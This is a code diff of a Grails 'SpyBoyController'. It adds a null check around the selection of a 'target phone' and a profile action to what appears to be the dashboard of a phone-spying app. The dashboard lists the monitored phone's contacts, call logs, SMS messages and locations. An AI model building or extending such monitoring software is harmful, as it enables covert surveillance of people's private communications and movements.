@@ -289,73 +289,76 @@ class SpyBoyController {
 			order("alias", "asc")
 		}
 
-
 		TargetPhone currentTargetPhone = null;
+		
+		if(targetPhones!=null){
 
-		if(simSubscriberId!=null && !simSubscriberId.isEmpty()){
-			if(!validateSimID(simSubscriberId,targetPhones)){
-				log.info "invalue target phone for this user."
-				flash.message = "invalue target phone for this user.";
-				return
+
+			if(simSubscriberId!=null && !simSubscriberId.isEmpty()){
+				if(!validateSimID(simSubscriberId,targetPhones)){
+					log.info "invalue target phone for this user."
+					flash.message = "invalue target phone for this user.";
+					return
+				}else{
+					currentTargetPhone = TargetPhone.findBySimSubscriberId(simSubscriberId);
+				}
 			}else{
-				currentTargetPhone = TargetPhone.findBySimSubscriberId(simSubscriberId);
-			}
-		}else{
-			currentTargetPhone = targetPhones.first();
-			params.simSubscriberId = simSubscriberId = currentTargetPhone.simSubscriberId;
-		}
-
-		//contacts
-		def contactCriteria = Contact.createCriteria()
-		contacts = contactCriteria.list{
-			and {
-				targetPhone{
-					eq("simSubscriberId", currentTargetPhone.simSubscriberId)
-				}
-			}
-			order("name", "asc")
-		}
-
-		if(contacts!=null && contacts.size()>0){
-			Contact defaultContact = contacts.get(0);
-			String defaultNumber = defaultContact.number;
-
-			//call logs
-			def callLogCriteria = CallLog.createCriteria()
-			callLogs = callLogCriteria.list(offset:0,max:5) {
-				and {
-					eq("phoneNumber", defaultNumber)
-					targetPhone{
-						eq("simSubscriberId", currentTargetPhone.simSubscriberId)
-					}
-				}
-				order("timeSeconds","desc")
+				currentTargetPhone = targetPhones.first();
+				params.simSubscriberId = simSubscriberId = currentTargetPhone.simSubscriberId;
 			}
 
-			//smses
-			def smsCriteria = Sms.createCriteria()
-			smss = smsCriteria.list(offset:0,max:5) {
-				and {
-					eq("address", defaultNumber)
-					targetPhone{
-						eq("simSubscriberId", currentTargetPhone.simSubscriberId)
-					}
-				}
-				order("time","desc")
-			}
-
-			// locations
-			def locationCriteria = Location.createCriteria()
-			locations = locationCriteria.list (offset:0,max:5) {
+			//contacts
+			def contactCriteria = Contact.createCriteria()
+			contacts = contactCriteria.list{
 				and {
 					targetPhone{
 						eq("simSubscriberId", currentTargetPhone.simSubscriberId)
 					}
 				}
-				order("time", "desc")
+				order("name", "asc")
+			}
+
+			if(contacts!=null && contacts.size()>0){
+				Contact defaultContact = contacts.get(0);
+				String defaultNumber = defaultContact.number;
+
+				//call logs
+				def callLogCriteria = CallLog.createCriteria()
+				callLogs = callLogCriteria.list(offset:0,max:5) {
+					and {
+						eq("phoneNumber", defaultNumber)
+						targetPhone{
+							eq("simSubscriberId", currentTargetPhone.simSubscriberId)
+						}
+					}
+					order("timeSeconds","desc")
+				}
+
+				//smses
+				def smsCriteria = Sms.createCriteria()
+				smss = smsCriteria.list(offset:0,max:5) {
+					and {
+						eq("address", defaultNumber)
+						targetPhone{
+							eq("simSubscriberId", currentTargetPhone.simSubscriberId)
+						}
+					}
+					order("time","desc")
+				}
+
+				// locations
+				def locationCriteria = Location.createCriteria()
+				locations = locationCriteria.list (offset:0,max:5) {
+					and {
+						targetPhone{
+							eq("simSubscriberId", currentTargetPhone.simSubscriberId)
+						}
+					}
+					order("time", "desc")
+				}
 			}
 		}
-		[activeSimSubscriberId:simSubscriberId,targetPhoneInstanceList:targetPhones,user:currentUser,scrollToID:scrollTo,contactInstanceList: contacts,contactInstanceTotal: contacts.size(),smsInstanceTotal: smss!=null ? smss.size():0,callLogsInstanceTotal: callLogs!=null ? callLogs.size():0,locationInstanceList:locations as JSON,locationInstanceTotal: locations!=null ? locations.size():0]
+		[currentTargetPhone:currentTargetPhone,activeSimSubscriberId:simSubscriberId,targetPhoneInstanceList:targetPhones,user:currentUser,scrollToID:scrollTo,contactInstanceList: contacts,contactInstanceTotal: contacts.size(),smsInstanceTotal: smss!=null ? smss.size():0,callLogsInstanceTotal: callLogs!=null ? callLogs.size():0,locationInstanceList:locations as JSON,locationInstanceTotal: locations!=null ? locations.size():0]
 	}
 
 
@@ -364,6 +367,12 @@ class SpyBoyController {
 	}
 
 	def login(){
+	}
+
+	def profile(){
+		def username  = SecurityUtils.subject?.principal
+		User currentUser = User.findByUsername(username);
+		[user:currentUser]
 	}
 
 	def layout_blank_page(){
